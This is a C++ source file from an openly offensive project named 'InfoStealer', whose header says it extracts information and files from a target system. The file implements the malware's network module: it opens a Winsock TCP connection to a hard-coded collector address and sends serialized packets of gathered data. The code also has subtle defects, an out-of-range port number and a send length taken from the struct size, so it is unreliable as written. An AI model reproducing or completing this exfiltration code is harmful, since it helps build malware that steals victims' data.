/* 
* InfoStealer - Extracts information and interesting files from a target system.
* Copyright (C) 2023 Sebastian Hasch - <https://github.com/Zelyson/InfoStealer>
* 
* This program is free software licensed under the GNU General Public License version 3:
* you can redistribute it and/or modify it under the terms of the 
* GNU General Public License version 3 as published by the Free Software Foundation.
* 
* You should have received a copy of the GNU General Public License
* along with this program. If not, see <https://www.gnu.org/licenses/gpl-3.0>.
*/

#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#pragma comment(lib,"WS2_32")

#include "../../include/communication/comms.hpp"
#include "../../include/util/util.hpp"
#include "../../include/util/serialization.hpp"

constexpr auto ADDRESS = L"127.0.0.1";
constexpr auto PORT = 69420;

comms::comms() {
	WSADATA wsa_data;
	SOCKADDR_IN addr;
	(void*) WSAStartup(MAKEWORD(2, 0), &wsa_data);

	this->server = socket(AF_INET, SOCK_STREAM, 0);
	InetPtonW(AF_INET, ADDRESS, &addr.sin_addr.s_addr);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(PORT);

	connect(this->server, reinterpret_cast<SOCKADDR*>(&addr), sizeof(addr));
}

comms::~comms() {
	closesocket(this->server);
	WSACleanup();
}

int comms::send_c(util::Packet& packet) {
	const char* data = serialization::serialize(packet);
	return send(this->server, data, sizeof(util::Packet), 0);
		
}
